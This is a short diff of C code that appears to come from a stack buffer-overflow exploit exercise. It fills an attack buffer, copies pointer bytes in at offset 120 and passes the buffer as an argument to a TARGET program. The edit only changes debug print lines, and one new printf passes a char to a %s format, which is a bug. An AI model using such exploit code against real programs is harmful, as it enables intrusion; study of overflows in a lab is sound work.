@@ -42,8 +42,8 @@ main ( int argc, char * argv[] )
     	*(attack_buffer + 120 + i) = ptr[i];
 }
 
-	printf("hex: %x\n",attack_buffer[BUF_TO_RET]);
-	printf("&: %x\n",*(&attack_buffer[BUF_TO_RET]));
+	printf("hex: %s\n",attack_buffer[BUF_TO_RET]);
+	// printf("&: %x\n",*(&attack_buffer[BUF_TO_RET]));
 
 	args[0] = TARGET;
 	args[1] = attack_buffer;
